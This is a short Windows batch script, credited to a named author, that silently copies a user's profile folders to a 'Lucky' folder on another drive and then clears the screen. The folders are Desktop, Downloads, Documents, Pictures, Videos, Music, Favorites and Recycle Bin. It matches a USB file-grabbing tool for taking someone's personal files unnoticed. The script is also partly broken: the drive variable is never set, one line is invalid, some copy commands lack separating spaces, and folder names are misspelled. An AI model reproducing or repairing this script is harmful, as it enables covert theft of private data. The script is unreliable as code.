@echo off
color c
echo done by :- salman abu latif
echo 7/10/2018
echo.
::variables
/min
SET odrive=%drive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo off
%backupcmd%"%USERPROFILE%" "%drive%/Lucky\Favorites" 
%backupcmd%"%USERPROFILE%\Favorites" "%drive%\Lucky\Favorties"
%backupcmd%"%USERPROFILE%\videos" "%drive%\Lucky\vids"
%backupcmd%"%USERPROFILE%\Desktop" "%drive%\Lucky\Desktop"
%backupcmd%"%USERPROFILE%\Recycle Bin" "%drive%\Lucky\Desktop"
%backupcmd%"%USERPROFILE%\Downloads" "%drive%\Lucky\Lib"
%backupcmd% "%USERPROFILE%\Documents""%drive%\Lucky\dou"
%backupcmd% "%USERPROFILE%\Pictures""%drive%\Lucky\dou"
%backupcmd% "%USERPROFILE%\Videos""%drive%\Lucky\dou"
%backupcmd% "%USERPROFILE%\Music""%drive%\Lucky\dou"

@echo off
cls